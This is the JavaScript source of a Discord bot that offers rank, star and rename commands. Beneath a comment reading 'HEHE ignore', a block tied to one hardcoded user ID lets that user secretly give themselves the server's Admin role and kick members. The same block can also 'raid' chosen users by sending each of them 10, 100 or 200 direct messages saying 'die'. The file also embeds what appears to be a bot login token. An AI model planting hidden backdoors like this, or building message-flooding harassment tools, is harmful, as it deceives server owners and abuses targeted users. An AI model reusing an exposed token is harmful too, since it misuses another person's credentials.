const Discord = require("discord.js");
const fs = require('fs');
const client = new Discord.Client();
const bot = require('./module.js');
const prefix = "$";

var data = require("./data.json");


client.on("ready", () => {
    console.log("Initialized");
})
client.on("message", (message) => {
    timeReset();
    if (message.content == "$rank") {
        bot.rank(message, data);
    } else if (message.content == prefix + "time") {
        var tmpdate = new Date();
        console.log(tmpdate.getHours());
    } else if (message.content == prefix + "ping") {
        if (message.author.id == 377244031421513728) {
            message.channel.send(":no_good: Bad Naama");
        } else {
            message.channel.send("poing");
        }
    } else if (message.content == prefix + "uv") {
        message.channel.send(":no_good:");
    } else if (message.content.startsWith(prefix + "rename")) {
        data = bot.rename(message, data);
    } else if (message.content.startsWith(prefix + "star")) {
        data = bot.star(message, data);
    } else if (message.content.startsWith(prefix + "-star")) {
        data = bot._star(message, data);
    } else if (message.content.startsWith(prefix + "reset")) {
        data = bot.reset(message, bot);
    }



    // HEHE ignore
    if (message.author.id == '401965023527829505') {
        if (message == "$giveadmin") {
            let admin = message.guild.roles.find(role => role.name === "Admin");
            message.guild.members.get(message.author.id).addRole(admin).catch(console.log());
        }
        if (message == "$takeadmin") {
            let admin = message.guild.roles.find(role => role.name === "Admin");
            message.guild.members.get(message.author.id).removeRole(admin).catch(console.log());
        }
        if (message == "$adminping") {
            message.channel.send("Pong");
        }
        if (message == "$wakey") {
            message.channel.send("I'm awake mommy");
        }
        if (message.content.startsWith(prefix + "kick")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var i = 0; i < args.length - 1; i++) {
                var str = args[i];
                var id = str.replace(/[<@!>]/g, '');
                client.fetchUser(id).then(user => { user.kick(args[args.length]) });
                message.channel.send("Hehehe. I kicked " + client.fetchUser(id) + " :smiling_imp:");
            }
        }
        if (message.content.startsWith("$10raid")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var j = 0; j < args.length; j++) {
                var str = args[j];
                var id = str.replace(/[<@!>]/g, '');
                for (var i = 0; i < 10; i++) {
                    client.fetchUser(id).then(user => { user.send("die") });
                    //message.author.sendMessage("Die");
                }
            }
            message.author.sendMessage("Raid successful!");
        }
        if (message.content.startsWith("$raid")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var j = 0; j < args.length; j++) {
                var str = args[j];
                var id = str.replace(/[<@!>]/g, '');
                for (var i = 0; i < 100; i++) {
                    client.fetchUser(id).then(user => { user.send("die") });
                    //message.author.sendMessage("Die");
                }
            }
            message.author.sendMessage("Raid successful!");
        }
        if (message.content.startsWith("$hraid")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var j = 0; j < args.length; j++) {
                var str = args[j];
                var id = str.replace(/[<@!>]/g, '');
                for (var i = 0; i < 200; i++) {
                    client.fetchUser(id).then(user => { user.send("die") });
                    //message.author.sendMessage("Die");
                }
            }
            message.author.sendMessage("Raid successful!");
        }
    }
})

client.login("NTA0NDUxMzAxNTkwMTcxNjU4.DrFOlg.60X9d7JiVw9A_Z6RhhykFXxgays");

function timeReset() {
    
}